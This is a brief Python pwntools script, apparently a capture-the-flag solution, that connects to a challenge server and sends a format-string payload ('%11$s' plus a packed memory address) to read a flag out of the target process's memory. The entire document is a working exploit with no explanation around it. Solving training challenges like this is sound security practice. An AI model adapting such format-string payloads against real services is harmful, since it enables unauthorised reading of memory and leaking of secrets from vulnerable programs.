from pwn import *

ADDR = 0x4040c0 # address of flag

conn = remote('chal.sigpwny.com', 1382)

exploit = b''
exploit += b'%11$s___'
exploit += p64(ADDR)

conn.sendline(exploit)

conn.interactive()